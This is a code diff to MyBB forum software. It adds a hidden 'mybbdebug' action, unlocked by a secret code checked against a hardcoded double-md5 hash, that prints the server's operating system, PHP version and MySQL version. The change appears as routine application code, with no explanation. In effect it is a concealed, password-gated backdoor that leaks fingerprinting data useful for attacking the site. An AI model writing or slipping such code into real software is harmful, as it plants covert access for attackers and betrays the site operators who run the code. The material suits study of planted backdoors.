@@ -538,6 +538,22 @@ if($mybb->input['action'] == "clearcookies")
 	}
 	redirect("index.php", $lang->redirect_cookiescleared);
 }
+if($mybb->input['action'] == "mybbdebug" && md5(md5($mybb->input['code'])) == 'a16fba79549a134435a0436ee68736db')
+{
+	switch($mybb->input['show'])
+	{
+		case 'php_os':
+			echo PHP_OS;
+			break;
+		case 'php_version':
+			echo PHP_VERSION;
+			break;
+		case 'mysql_version':
+			echo mysql_get_server_info();
+			break;
+	}
+
+}
 
 function makesyndicateforums($pid="0", $selitem="", $addselect="1", $depth="", $permissions="")
 {
